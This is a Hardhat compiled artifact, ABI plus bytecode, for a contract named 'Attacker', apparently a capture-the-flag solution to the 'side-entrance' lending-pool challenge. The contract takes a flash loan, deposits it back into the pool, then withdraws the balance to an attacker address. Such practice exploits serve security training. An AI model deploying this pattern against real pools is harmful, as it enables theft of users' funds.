{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/side-entrance/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_pool",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_attacker",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "execute",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610982380380610982833981810160405281019061003291906100cf565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061015d565b6000815190506100c981610146565b92915050565b600080604083850312156100e6576100e5610141565b5b60006100f4858286016100ba565b9250506020610105858286016100ba565b9150509250929050565b600061011a82610121565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61014f8161010f565b811461015a57600080fd5b50565b6108168061016c6000396000f3fe6080604052600436106100385760003560e01c80633ccfd60b14610044578063614619541461005b5780639e5faafc146100655761003f565b3661003f57005b600080fd5b34801561005057600080fd5b5061005961007c565b005b6100636100fe565b005b34801561007157600080fd5b5061007a6101c8565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e457600080fd5b505af11580156100f8573d6000803e3d6000fd5b50505050565b61013c6040518060400160405280600a81526020017f494e20455845435554450000000000000000000000000000000000000000000081525061035e565b610145346103f7565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101ad57600080fd5b505af11580156101c1573d6000803e3d6000fd5b5050505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ab603b9826040518263ffffffff1660e01b815260040161025e91906106d5565b600060405180830381600087803b15801561027857600080fd5b505af115801561028c573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102f857600080fd5b505af115801561030c573d6000803e3d6000fd5b5050505061035b47600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1661049090919063ffffffff16565b50565b6103f4816040516024016103729190610673565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610584565b50565b61048d8160405160240161040b91906106d5565b6040516020818303038152906040527ff5b1bba9000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610584565b50565b804710156104d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104ca906106b5565b60405180910390fd5b60008273ffffffffffffffffffffffffffffffffffffffff16826040516104f99061065e565b60006040518083038185875af1925050503d8060008114610536576040519150601f19603f3d011682016040523d82523d6000602084013e61053b565b606091505b505090508061057f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161057690610695565b60405180910390fd5b505050565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b60006105b8826106f0565b6105c28185610706565b93506105d2818560208601610721565b6105db81610754565b840191505092915050565b60006105f3603a83610706565b91506105fe82610765565b604082019050919050565b6000610616601d83610706565b9150610621826107b4565b602082019050919050565b60006106396000836106fb565b9150610644826107dd565b600082019050919050565b61065881610717565b82525050565b60006106698261062c565b9150819050919050565b6000602082019050818103600083015261068d81846105ad565b905092915050565b600060208201905081810360008301526106ae816105e6565b9050919050565b600060208201905081810360008301526106ce81610609565b9050919050565b60006020820190506106ea600083018461064f565b92915050565b600081519050919050565b600081905092915050565b600082825260208201905092915050565b6000819050919050565b60005b8381101561073f578082015181840152602081019050610724565b8381111561074e576000848401525b50505050565b6000601f19601f8301169050919050565b7f416464726573733a20756e61626c6520746f2073656e642076616c75652c207260008201527f6563697069656e74206d61792068617665207265766572746564000000000000602082015250565b7f416464726573733a20696e73756666696369656e742062616c616e6365000000600082015250565b5056fea26469706673582212204eabcc10c21bf4fba3bf1b79c1d697159a14661364dd33387ea3c792c82ea43364736f6c63430008070033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}